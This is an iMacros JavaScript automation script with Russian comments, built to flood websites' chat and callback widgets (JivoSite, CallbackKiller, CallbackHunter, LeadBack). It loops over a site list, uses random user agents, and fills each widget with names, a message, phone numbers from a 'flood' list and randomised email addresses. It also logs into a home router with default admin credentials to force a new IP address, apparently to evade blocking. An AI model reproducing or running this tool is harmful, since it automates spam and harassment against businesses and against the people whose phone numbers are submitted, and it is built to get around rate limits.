 
var Datasources="C:\\Users\\user\\Google диск\\imacros\\Datasources\\"
var macros = "C:\\Users\\user\\Google диск\\imacros\\macros\\флуд\\"
cbh=0,cbk=0,jivosite=0,leadback=0;
 
var mail="echayk@mail.ru"
 
var start = new Date(); function timming() {diff=(new Date()-start)/1000; return ';\nЗатрачено времени: '+Math.floor(diff/3600)+'ч:'+(Math.floor(diff/60)-(Math.floor(diff/3600)*60))+'м:'+Math.round(diff%60)+'с';}

function getRandomInt(min, max){return Math.round(min - 0.5 + Math.random() * (max - min + 1))}

var modemKostia = ('SET !REPLAYSPEED medium\n SET !TIMEOUT_STEP 20\nSET !EXTRACT NULL\n ONLOGIN USER=admin PASSWORD=admin\n URL GOTO=192.168.1.1\n URL GOTO=192.168.1.1\n TAG POS=1 TYPE=A ATTR=HREF:http://192.168.1.1/#broadband.globals\n URL GOTO=http://192.168.1.1/#broadband.globals\nwait seconds=2\nTAG POS=1 TYPE=TD ATTR=CLASS:td_ip<SP>text EXTRACT=TXT\nTAG POS=1 TYPE=TD ATTR=TXT:Internet\nwait seconds=2\nTAG POS=1 TYPE=BUTTON FORM=NAME:editor ATTR=TXT:Применить\nwait seconds=21\nTAG POS=1 TYPE=TD ATTR=CLASS:td_ip<SP>text EXTRACT=TXT')
function saveFile(путь, контент) {var файл = imns.FIO.openNode(путь); imns.FIO.writeTextFile(файл,контент)}
var date=String(Date()); var date=date.replace(/ /ig,'-').replace(/:/ig,'_');  
function status1() {return 'cbh: '+cbh+', cbk:'+cbk+', js:'+jivosite+'\nСтрока:'+(i+1)+' из '+arr.length+timming()}
var логи="c:\\"+date+".txt"
 
function loadFile(путь) {var файл = imns.FIO.openNode(путь); return imns.FIO.readTextFile(файл)}
function копиБоди() {try{var x = window.document.getElementsByTagName("body")[0].textContent;}catch(e){var x='sex'} return x;}
//читать весь блокнот:
var ex=imns.FIO.readTextFile(imns.FIO.openNode("C:\\4flood\\jivosite.txt"))
//разбить на массив:
var arr = ex.split('\n');

for(i=16;i<arr.length;i++)
	{	//alert(i+arr[i])
		var mail=getRandomInt(1,111)+"echayk@mail.ru"
	 	txt=loadFile(Datasources+"names4reg.txt");var massiv = txt.split('\n');name=massiv[getRandomInt(1, massiv.length-1)];			// name..
		txt=loadFile(Datasources+"4_flood_sms.txt");var massiv = txt.split('\n');sms=massiv[i];		// sms
		txt=loadFile(Datasources+"4_flood_tels.txt");var massiv = txt.split('\n');tel=massiv[getRandomInt(1, massiv.length-1)];					// tel
		txt=loadFile(Datasources+"useragents-pc.txt");var massiv = txt.split('\n');useragent=massiv[getRandomInt(1, massiv.length-1)];  // useragent
		//txt=loadFile(Datasources+"proxy.txt");var massiv = txt.split('\r\n');proxy=massiv[getRandomInt(1, massiv.length-1)];				// proxy
		
		iimSet("сайт",arr[i]); iimSet("useragent",useragent); 
		iimPlayCode(`SET !REPLAYSPEED FAST\n SET !USERAGENT {{useragent}}\n SET !TIMEOUT_PAGE 22\n clear\n
		url goto={{сайт}}\n wait seconds=1`);
		
	try{var htmlSource = копиБоди()}catch(e){var htmlSource="фывыфвфывф"}
	 	
		if(htmlSource.search( /jivosite/i )!=-1)
		{ jivosite++;var status2="[ЖИВО]\n"+status1()
		iimDisplay(status2);  saveFile(логи, status2); // сохр в файл (перезапись,еси файл сущ);
			iimPlayCode('wait seconds=2')
 
			iimSet("name",name); iimSet("sms",sms); iimSet("tel",tel); iimSet("mail",mail)
			iimPlay("1-jivosite.iim")
			 
		} 

	if(htmlSource.search( /callbackkiller/i )!=-1)
		{cbk++; var status2="[cbk]\n"+status1();
		iimDisplay(status2); saveFile(логи, status2); // сохр в файл (перезапись,еси файл сущ);
			iimPlayCode('wait seconds=1')
			iimSet("name",name); iimSet("sms",sms); iimSet("tel",tel); iimSet("mail",mail)
			iimPlay("1-cbk.iim")
			} 

	if(htmlSource.search( /callbackhunter/i )!=-1)
		{cbh++; var status2="[cbh]\n"+status1();
		iimDisplay(status2); saveFile(логи, status2); // сохр в файл (перезапись,еси файл сущ);
			iimPlayCode('wait seconds=1')
			iimSet("name",name); iimSet("sms",sms); iimSet("tel",tel); iimSet("mail",mail)
			iimPlay("1-cbh.iim")
			} 

	if(htmlSource.search( /leadback/i )!=-1)
		{cbh++; var status2="[leadback]\n"+status1();
		iimDisplay(status2); saveFile(логи, status2); // сохр в файл (перезапись,еси файл сущ);
			iimPlayCode('wait seconds=1')
			iimSet("tel",tel);
			iimPlay("1-leadBack.iim")
			} 
 
 //ГОКАЕМ МЕНТЬ АЙПИ:
	if(getRandomInt(1,1)==5){try{function testModem1(ip1){x=ip1.split('.')[0]; y=ip1.split('.')[1]; ip1=x+"."+y; return ip1};function testModem2(ip2){x=ip2.split('.')[0];y=ip2.split('.')[1]; ip2=x+"."+y; return ip2};do{ iimPlayCode(modemKostia);ip1=iimGetLastExtract(1);ip2=iimGetLastExtract(2)} while((testModem1(ip1)==testModem2(ip2))||(testModem2(ip2)=="#EANF#"))} catch(r){}}	
		
	}


